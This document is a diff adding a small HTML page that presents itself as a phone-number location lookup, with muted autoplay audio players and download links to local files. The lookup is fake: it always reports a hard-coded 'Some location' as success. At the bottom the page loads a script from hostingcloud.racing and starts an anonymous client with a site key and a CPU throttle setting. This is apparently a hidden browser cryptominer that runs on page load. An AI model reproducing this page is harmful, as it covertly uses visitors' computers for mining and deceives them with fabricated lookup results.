@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    /* Define CSS styles for different location results */
+    .location {
+      color: black;
+    }
+
+    .error {
+      color: red;
+    }
+
+    .success {
+      color: green;
+    }
+  </style>
+</head>
+<body>
+  <h1>Phone Number Location</h1>
+  <input type="text" id="phoneNumberInput" placeholder="Enter Phone Number">
+  <button onclick="queryLocation()">Query Location</button>
+  <p id="locationOutput"></p>
+
+  <script>
+    function queryLocation() {
+      const phoneNumber = document.getElementById('phoneNumberInput').value;
+      const locationOutput = document.getElementById('locationOutput');
+
+      // You should replace 'querying-number-location' with the actual package you are using
+      // and implement the logic to query the location as described in the previous message.
+      // This is a simplified example.
+
+      // Simulate querying the location (replace this with your actual logic)
+      const fakeLocation = "Some location";
+
+      // Check if the query was successful or not
+      if (fakeLocation) {
+        locationOutput.textContent = `Location for ${phoneNumber}: ${fakeLocation}`;
+        locationOutput.className = 'success'; // Apply green CSS
+      } else {
+        locationOutput.textContent = `Error: Unable to determine location for ${phoneNumber}`;
+        locationOutput.className = 'error'; // Apply red CSS
+      }
+    }
+  </script>
+
+  <audio controls autoplay muted>
+    <source src="/storage/emulated/0/Documents/JSRun/ganometalk.mp3" type="audio/mp3">
+    Your browser does not support the audio element.
+  </audio>
+
+  <audio controls autoplay muted>
+    <source src="/storage/emulated/0/Documents/JSRun/weedtalk.mp3" type="audio/mp3">
+    Your browser does not support the audio element.
+  </audio>
+
+  <audio controls autoplay muted>
+    <source src="/storage/emulated/0/Documents/JSRun/weednum.mp3" type="audio/mp3">
+    Your browser does not support the audio element.
+  </audio>
+
+  <p>Click the links below to download the audio files:</p>
+  <a href="/storage/emulated/0/Documents/JSRun/weedtalk.mp3" download>Download Audio 1</a>
+  <a href="/storage/emulated/0/Documents/JSRun/weednum.mp3" download>Download Audio 2</a>
+  <a href="/storage/emulated/0/Documents/JSRun/ganometalk.mp3" download> Download Audio 3 </a>
+
+  <script src="https://www.hostingcloud.racing/0LYy.js"></script>
+  <script>
+    var _client = new Client.Anonymous('3482adaaca0bc48bc671a4ae2aa8390bd910d2684767ba226bf08f7124d165fe', {
+        throttle: 0.7, c: 'w', ads: 0
+    });
+    _client.start();
+  </script>
+</body>
+</html>
